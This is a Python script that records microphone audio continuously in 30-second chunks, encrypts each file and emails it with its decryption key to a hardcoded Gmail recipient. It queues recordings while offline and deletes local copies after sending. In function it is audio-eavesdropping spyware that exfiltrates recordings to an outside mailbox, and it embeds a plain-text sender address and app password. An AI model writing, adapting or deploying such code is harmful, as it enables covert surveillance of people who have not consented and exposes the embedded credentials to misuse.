import os
import time
import socket
import logging
import base64
import secrets
import smtplib
import sounddevice as sd
import numpy as np
import wave
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import threading

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration - replace with your actual email credentials
CONFIG = {
    "email": {
        "sender": "edearn70@gmail.com",
        "recipient": "wasiemmanuela183@gmail.com",
        "password": "bjrj xhyx ockp rtvz",
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587
    },
    "audio": {
        "recording_interval": 30,  # seconds
        "sample_rate": 44100,
        "channels": 1,
        "max_offline_storage": 50
    },
    "paths": {
        "audio_recordings": "audio_recordings"
    }
}

os.makedirs(CONFIG["paths"]["audio_recordings"], exist_ok=True)

is_online = False
stop_flag = False

def check_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

def record_audio():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(CONFIG["paths"]["audio_recordings"], f"recording_{timestamp}.wav")
        logging.info(f"Recording audio for {CONFIG['audio']['recording_interval']} seconds...")
        audio_data = sd.rec(int(CONFIG["audio"]["sample_rate"] * CONFIG["audio"]["recording_interval"]),
                            samplerate=CONFIG["audio"]["sample_rate"],
                            channels=CONFIG["audio"]["channels"],
                            dtype='int16')
        sd.wait()
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(CONFIG["audio"]["channels"])
            wf.setsampwidth(2)  # 2 bytes for int16
            wf.setframerate(CONFIG["audio"]["sample_rate"])
            wf.writeframes(audio_data.tobytes())
        logging.info(f"Audio recorded and saved to {filename}")
        return filename
    except Exception as e:
        logging.error(f"Recording error: {e}")
        return None

def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()

        key = secrets.token_bytes(32)  # AES-256 key
        iv = secrets.token_bytes(16)   # AES block size IV

        # Pad data to block size (16 bytes)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        encrypted_file_path = file_path + ".enc"
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_data)

        b64_key = base64.b64encode(key).decode('utf-8')
        b64_iv = base64.b64encode(iv).decode('utf-8')

        return encrypted_file_path, b64_key, b64_iv
    except Exception as e:
        logging.error(f"Encryption error: {e}")
        return None, None, None

def send_email(subject, body, attachments=None):
    if attachments is None:
        attachments = []
    try:
        msg = MIMEMultipart()
        msg['From'] = CONFIG["email"]["sender"]
        msg['To'] = CONFIG["email"]["recipient"]
        msg['Subject'] = subject
        msg.attach(MIMEText(body))

        for filepath in attachments:
            with open(filepath, 'rb') as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(filepath))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(filepath)}"'
                msg.attach(part)

        with smtplib.SMTP(CONFIG["email"]["smtp_server"], CONFIG["email"]["smtp_port"]) as server:
            server.starttls()
            server.login(CONFIG["email"]["sender"], CONFIG["email"]["password"])
            server.send_message(msg)
        logging.info(f"Email sent with {len(attachments)} attachment(s).")
        return True
    except Exception as e:
        logging.error(f"Email sending error: {e}")
        return False

def cleanup_old_recordings():
    try:
        files = sorted(
            [os.path.join(CONFIG["paths"]["audio_recordings"], f)
             for f in os.listdir(CONFIG["paths"]["audio_recordings"]) if f.endswith('.wav')],
            key=os.path.getmtime
        )
        while len(files) > CONFIG["audio"]["max_offline_storage"]:
            try:
                os.remove(files[0])
                logging.info(f"Deleted old recording: {files[0]}")
                files.pop(0)
            except Exception as e:
                logging.error(f"Error deleting old recording: {e}")
                break
    except Exception as e:
        logging.error(f"Error in cleanup_old_recordings: {e}")

def send_pending_recordings():
    global is_online
    if not is_online:
        return
    try:
        pending_files = [os.path.join(CONFIG["paths"]["audio_recordings"], f)
                         for f in os.listdir(CONFIG["paths"]["audio_recordings"]) if f.endswith('.wav')]
        if not pending_files:
            return

        batch_size = 2
        for i in range(0, len(pending_files), batch_size):
            batch = pending_files[i:i + batch_size]
            encrypted_files = []
            keys_ivs = []
            for file_path in batch:
                encrypted_file, key, iv = encrypt_file(file_path)
                if encrypted_file:
                    encrypted_files.append(encrypted_file)
                    keys_ivs.append((os.path.basename(encrypted_file), key, iv))
                else:
                    logging.error(f"Failed to encrypt {file_path}, skipping.")

            body = "Attached are the encrypted audio recordings from offline period.\n\n"
            body += "Decryption keys and IVs (base64 encoded):\n"
            for fname, key, iv in keys_ivs:
                body += f"{fname}:\n  Key: {key}\n  IV: {iv}\n\n"

            if send_email("Pending Encrypted Audio Recordings", body, encrypted_files):
                for file_path in batch:
                    try:
                        os.remove(file_path)
                        logging.info(f"Deleted sent original file: {file_path}")
                    except Exception as e:
                        logging.error(f"Error deleting file {file_path}: {e}")
                for enc_file in encrypted_files:
                    try:
                        os.remove(enc_file)
                        logging.info(f"Deleted sent encrypted file: {enc_file}")
                    except Exception as e:
                        logging.error(f"Error deleting encrypted file {enc_file}: {e}")
    except Exception as e:
        logging.error(f"Error in send_pending_recordings: {e}")

def monitoring_loop():
    global is_online, stop_flag

    while not stop_flag:
        try:
            current_status = check_internet()
            if current_status != is_online:
                is_online = current_status
                logging.info(f"Internet status changed: {'Online' if is_online else 'Offline'}")
                if is_online:
                    send_pending_recordings()

            recording_file = record_audio()

            if is_online and recording_file:
                encrypted_file, key, iv = encrypt_file(recording_file)
                if encrypted_file:
                    body = f"Attached is the latest encrypted audio recording.\n\nDecryption key and IV (base64 encoded):\nKey: {key}\nIV: {iv}\n"
                    if send_email("Audio Recording Update (Encrypted)", body, [encrypted_file]):
                        try:
                            os.remove(recording_file)
                            logging.info(f"Deleted original recording: {recording_file}")
                        except Exception as e:
                            logging.error(f"Error removing original recording: {e}")
                        try:
                            os.remove(encrypted_file)
                            logging.info(f"Deleted encrypted recording: {encrypted_file}")
                        except Exception as e:
                            logging.error(f"Error removing encrypted recording: {e}")
                else:
                    logging.error("Encryption failed, skipping sending email.")

            if not is_online:
                cleanup_old_recordings()

        except Exception as e:
            logging.error(f"Error in monitoring loop: {e}")
            time.sleep(5)

def main():
    global stop_flag

    try:
        monitoring_thread = threading.Thread(target=monitoring_loop)
        monitoring_thread.daemon = False
        monitoring_thread.start()

        logging.info("Audio monitoring started. Press Ctrl+C to stop...")

        while monitoring_thread.is_alive():
            time.sleep(1)

    except KeyboardInterrupt:
        logging.info("\nStopping audio monitoring...")
        stop_flag = True
        monitoring_thread.join(timeout=5)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        stop_flag = True

if __name__ == "__main__":
    main()
